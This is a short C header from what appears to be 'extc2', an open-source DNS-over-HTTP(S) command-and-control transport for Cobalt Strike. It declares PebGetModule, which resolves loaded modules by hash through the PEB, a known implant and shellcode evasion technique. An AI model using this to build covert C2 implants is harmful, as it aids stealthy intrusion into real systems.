/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

/*-
 *
 * PebGetModule
 *
 * Purpose:
 *
 * Finds a currently loaded module matching
 * the specified hash from PEB.
 *
-*/
DEFINESEC(B) PVOID PebGetModule( IN ULONG Hsh );
